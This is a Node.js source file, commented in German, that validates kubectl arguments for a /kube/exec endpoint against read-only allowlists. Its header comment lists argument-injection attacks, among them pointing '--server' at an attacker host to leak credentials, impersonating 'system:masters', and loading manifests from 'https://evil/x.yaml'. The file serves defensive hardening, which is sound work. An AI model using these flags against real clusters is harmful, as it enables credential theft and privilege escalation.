'use strict';

/**
 * Argument-Allowlist für POST /kube/exec (Review-Fund C-2).
 *
 * `execFile` ohne Shell schützt nur gegen Shell-Metazeichen. Gegen
 * ARGUMENT-Injection schützt es nicht — und kubectl hat Global-Flags, die
 * jede Grenze der Session aushebeln:
 *
 *   --kubeconfig=/run/kube-sessions/<fremd>.yaml   fremde Session benutzen
 *   --server=https://attacker --insecure-skip-…    Client-Cert/Token an Dritte
 *   --as=… --as-group=system:masters               Impersonation
 *   create -f https://evil/x.yaml                  SSRF + Schreibzugriff
 *   delete|apply|scale|exec …                      Schreibzugriff auf Cluster,
 *                                                  die als readOnly modelliert sind
 *
 * Deshalb hier ausschliesslich Allowlists: ein lesendes Verb an Position 0,
 * pro Verb eine enge Flag-Liste, und JEDES Argument mit führendem `-`, das
 * nicht darauf steht, wird abgelehnt. Schreibaktionen laufen laut K3-Plan
 * über den getypten Client im Backend, nicht über dieses Binary.
 *
 * Bewusst NICHT erlaubt, auch wenn lesend:
 *   - `config view` (gibt die Session-Kubeconfig samt Credentials aus)
 *   - `-f`/`--filename` ausser als `logs -f` (follow): bei get/describe liest
 *     es Dateien bzw. URLs — lokale Pfade wie andere Session-Dateien
 *     eingeschlossen
 *   - `-o …-file=` (go-template-file, jsonpath-file, custom-columns-file)
 *     liest ebenfalls lokale Dateien
 *   - `--raw` (beliebiger API-Pfad, umgeht die Ressourcen-Semantik)
 *   - `-w`/`--watch` (blockiert bis zum Timeout)
 *   - gebündelte Kurzflags (`-Ao`) und `-nfoo`: nur `-n foo` / `--namespace=foo`
 */

const COMMON_FLAGS = ['namespace', 'all-namespaces', 'output', 'selector', 'field-selector',
  'show-labels', 'sort-by', 'no-headers', 'label-columns', 'show-kind', 'show-managed-fields',
  'request-timeout', 'v'];

/** Kurzform -> Langform, nur für die hier erlaubten Flags. */
const SHORT = { n: 'namespace', A: 'all-namespaces', o: 'output', l: 'selector', L: 'label-columns' };

const VERBS = {
  get: { flags: [...COMMON_FLAGS, 'ignore-not-found', 'chunk-size'] },
  describe: { flags: [...COMMON_FLAGS, 'show-events'] },
  logs: {
    flags: ['namespace', 'container', 'all-containers', 'tail', 'since', 'since-time',
      'previous', 'timestamps', 'limit-bytes', 'selector', 'prefix', 'follow', 'max-log-requests',
      'request-timeout', 'v'],
    short: { c: 'container', p: 'previous', f: 'follow' },
  },
  top: { flags: [...COMMON_FLAGS, 'containers', 'use-protocol-buffers'] },
  version: { flags: ['output', 'client', 'request-timeout', 'v'] },
  'api-resources': { flags: ['output', 'api-group', 'namespaced', 'verbs', 'sort-by', 'no-headers',
    'cached', 'request-timeout', 'v'] },
  'api-versions': { flags: ['request-timeout', 'v'] },
  explain: { flags: ['recursive', 'api-version', 'output', 'request-timeout', 'v'] },
  config: { subcommands: ['current-context', 'get-contexts'], flags: ['output', 'no-headers'] },
  auth: { subcommands: ['can-i'], flags: ['namespace', 'all-namespaces', 'list', 'no-headers',
    'quiet', 'subresource', 'request-timeout', 'v'] },
};

/** Flags, die einen Wert verlangen (Rest sind Booleans). */
const VALUE_FLAGS = new Set(['namespace', 'output', 'selector', 'field-selector', 'sort-by',
  'label-columns', 'request-timeout', 'v', 'chunk-size', 'container', 'tail', 'since', 'since-time',
  'limit-bytes', 'max-log-requests', 'api-group', 'verbs', 'api-version', 'subresource']);

/** Erlaubte -o-Werte. Alles mit `-file` liest lokale Dateien und fällt raus. */
const OUTPUT_PATTERN = /^(json|yaml|wide|name|jsonpath=.*|jsonpath-as-json=.*|custom-columns=.*)$/;

/**
 * @param {unknown[]} args
 * @returns {string | null} Fehlermeldung, oder null wenn erlaubt
 */
function validateKubectlArgs(args) {
  const verb = args[0];
  const spec = Object.prototype.hasOwnProperty.call(VERBS, verb) ? VERBS[verb] : null;
  if (!spec) return `verb not allowed: ${String(verb).slice(0, 40)}`;

  let i = 1;
  if (spec.subcommands) {
    if (!spec.subcommands.includes(args[1])) {
      return `subcommand not allowed for ${verb}: ${String(args[1]).slice(0, 40)}`;
    }
    i = 2;
  }

  const shortMap = { ...SHORT, ...(spec.short || {}) };
  for (; i < args.length; i += 1) {
    const a = args[i];
    if (!a.startsWith('-')) continue; // Positionsargument (Ressource, Name)
    if (a === '-' || a === '--') return `argument not allowed: ${a}`;

    let name;
    let inlineValue;
    if (a.startsWith('--')) {
      const eq = a.indexOf('=');
      name = eq === -1 ? a.slice(2) : a.slice(2, eq);
      inlineValue = eq === -1 ? undefined : a.slice(eq + 1);
    } else {
      // Nur die exakte Form `-x`; `-nfoo`, `-n=foo` und `-Ao` werden abgelehnt,
      // damit kein gebündeltes Kurzflag an der Allowlist vorbeirutscht.
      if (a.length !== 2) return `short flag must stand alone: ${a.slice(0, 40)}`;
      name = shortMap[a[1]];
      if (!name) return `flag not allowed: ${a}`;
    }
    if (!spec.flags.includes(name)) return `flag not allowed for ${verb}: --${name.slice(0, 40)}`;

    if (VALUE_FLAGS.has(name)) {
      let value = inlineValue;
      if (value === undefined) {
        i += 1;
        value = args[i];
        if (value === undefined) return `flag --${name} requires a value`;
        if (value.startsWith('-')) return `flag --${name} value must not start with "-"`;
      }
      if (name === 'output' && !OUTPUT_PATTERN.test(value)) {
        return `output format not allowed: ${value.slice(0, 40)}`;
      }
    } else if (inlineValue !== undefined && inlineValue !== 'true' && inlineValue !== 'false') {
      return `flag --${name} takes no value`;
    }
  }
  return null;
}

module.exports = { validateKubectlArgs };
